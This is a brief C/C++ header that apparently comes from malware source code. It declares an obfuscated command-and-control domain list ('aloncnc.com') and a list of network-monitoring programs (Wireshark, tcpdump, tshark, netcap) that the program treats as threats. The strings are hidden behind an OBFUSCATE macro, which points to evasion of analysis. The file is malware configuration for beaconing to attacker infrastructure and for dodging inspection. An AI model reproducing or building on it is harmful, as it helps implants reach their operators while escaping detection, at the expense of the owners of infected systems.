#pragma once
#include "obfuscate.h"
const char* CNC_DOMAINS[] = {
	OBFUSCATE("aloncnc.com")
};

const char* THREAT_PROCESSES[] = {
	OBFUSCATE("wireshark.exe"),
	OBFUSCATE("tcpdump.exe"),
	OBFUSCATE("tshark.exe"),
	OBFUSCATE("netcap.exe")
};
